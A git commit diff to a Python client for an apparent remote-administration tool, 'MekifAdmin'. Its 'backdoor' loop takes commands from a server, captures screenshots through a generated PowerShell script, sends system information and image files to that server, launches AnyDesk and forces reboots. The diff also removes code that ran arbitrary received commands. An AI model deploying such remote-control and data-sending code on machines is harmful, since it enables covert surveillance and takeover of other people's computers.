435a1ae57bdb97ccc01ae767e1684b122c5d6582
Gil Shwartz <58849439+GShwartz@users.noreply.github.com>
2022-04-14 01:39:59 +0300

    Update client.py

--- MekifAdmin/client.py
+++ MekifAdmin/client.py
@@ -10,7 +10,7 @@ import time
 import tqdm
 import os
 import sys
-from PIL import ImageGrab, Image
+import struct
 
 
 class Client:
@@ -19,18 +19,20 @@ class Client:
         self.server_port = server[1]
         self.buffer_size = 16184
         self.d = datetime.now()
-        self.dt = str(self.d.strftime("%b %d %Y %I-%M-%S"))
+        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
         self.hostname = socket.gethostname()
-        self.localIP = str(socket.gethostbyname(self.hostname)).replace('.', '-')
+        self.localIP = str(socket.gethostbyname(self.hostname))
         self.filename = \
-            rf"c:\Users\{os.getlogin()}\Desktop\{self.hostname} {str(self.localIP).replace('.', '-')} {self.dt}.jpg"
+            rf"c:\Users\{os.getlogin()}\Desktop\screenshot {self.hostname} {str(self.localIP)} {self.dt}.jpg"
+        self.systeminfofile = rf"c:\Users\{os.getlogin()}\Desktop\systeminfo " \
+                              rf"{self.hostname} {str(self.localIP)} {self.dt}.txt"
 
     def connection(self):
         soc = socket.socket()
         soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
         while True:
-            time.sleep(2)
+            time.sleep(1)
             print(colored(f"[i]Connecting to Server: {self.server_host} | Port {self.server_port}...", 'cyan'))
             try:
                 soc.connect((self.server_host, self.server_port))
@@ -39,7 +41,43 @@ class Client:
             except (TimeoutError, WindowsError, ConnectionAbortedError) as e:
                 print(colored(e, 'red'))
                 break
-                # self.connection()
+
+    def send_files(self, soc):
+        chunk = 1000000
+        sysinfo = open(self.filename, 'rb')
+        msg = soc.recv(1024).decode()
+        print(msg)
+
+        while True:
+            data = sysinfo.read(chunk)
+            soc.sendall(data)
+
+            if not data:
+                sysinfo.close()
+                break
+
+        msg = soc.recv(1024).decode()
+        print(f"@Server: {msg}")
+
+    def boot_time(self, soc):
+        sysinfo = open(self.systeminfofile, 'w')
+        sinfo = subprocess.call(['systeminfo'], stdout=sysinfo)
+        sysinfo.close()
+        soc.send(f"{self.systeminfofile}".encode())
+
+        time.sleep(2)
+        sysinfo = open(self.systeminfofile, 'r')
+        while True:
+            data = sysinfo.read(1024)
+            soc.sendall(data.encode())
+
+            if not data:
+                sysinfo.close()
+                break
+
+        # soc.shutdown(1)
+        msg = soc.recv(1024).decode()
+        print(f"@Server: {msg}")
 
     def backdoor(self, soc):
         message = soc.recv(self.buffer_size).decode()
@@ -50,20 +88,9 @@ class Client:
             try:
                 if len(str(command)) == 0:
                     print(colored("[!]Disconnected!", 'red'))
-                    soc.shutdown(0)
-                    soc.close()
                     break
 
-                if str(command.lower()) == "exit":
-                    print(colored('[!]Connection closed by server.', 'yellow'))
-                    break
-
-                if str(command.lower()[:7]) == "anydesk":
-                    # Start Anydesk
-                    subprocess.call(r"C:\Program Files (x86)\AnyDesk\anydesk.exe")
-                    soc.send(f"(@{self.hostname} | {self.localIP}: Anydesk Started\n".encode())
-
-                if str(command.lower()) == "screen":
+                if str(command.lower()[:6]) == "screen":
                     path = rf'c:\Users\{os.getlogin()}\Desktop'
                     name = 'sc.ps1'
                     with open(rf'{path}\{name}', 'w+') as file:
@@ -80,30 +107,34 @@ class Client:
                         file.write(rf"$bitmap.Save('{self.filename}')")
 
                     time.sleep(0.2)
-                    ps = subprocess.Popen(["powershell.exe", r"C:\Users\gilsh\Desktop\sc.ps1"], stdout=sys.stdout)
+                    ps = subprocess.Popen(["powershell.exe", rf"C:\Users\{os.getlogin()}\Desktop\sc.ps1"], stdout=sys.stdout)
                     ps.communicate()
                     soc.send(f"{self.filename}".encode())
-                    sendImg = open(self.filename, "rb")
-                    while True:
-                        data = sendImg.read()
-                        soc.sendall(data)
+                    self.send_files(soc)
+                    soc.send(f"@{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
 
-                        if not data:
-                            break
+                if str(command.lower()[:7]) == "anydesk":
+                    # Start Anydesk
+                    subprocess.call(r"C:\Program Files (x86)\AnyDesk\anydesk.exe")
+                    soc.send(f"@{self.hostname} | {self.localIP}: Anydesk Started.\n".encode())
+                    continue
 
-                    sendImg.close()
+                if str(command.lower()[:2]) == "bt":
+                    self.boot_time(soc)
+                    continue
+
+                if str(command.lower()[:7]) == "restart":
+                    os.system('shutdown /r /t 1')
+
+                if str(command.lower()) == "exit":
+                    print(colored('[!]Connection closed by server.', 'yellow'))
+                    soc.shutdown(2)
                     soc.close()
-
-                if str(command.lower()) == "cmd":
-                    subprocess.call([r'c:\Windows\System32\cmd.exe', '/k', r"c:\Users\gilsh\Desktop"])
+                    sys.exit()
 
             except Exception as err:
                 print(colored(f"Error: {err} \n[!]Connection closed.", 'red'))
                 break
-
-            finally:
-                output = subprocess.getoutput(command)
-                soc.send(f"{output}\n".encode())
 
         soc.shutdown(socket.SHUT_RD)
         soc = socket.socket()
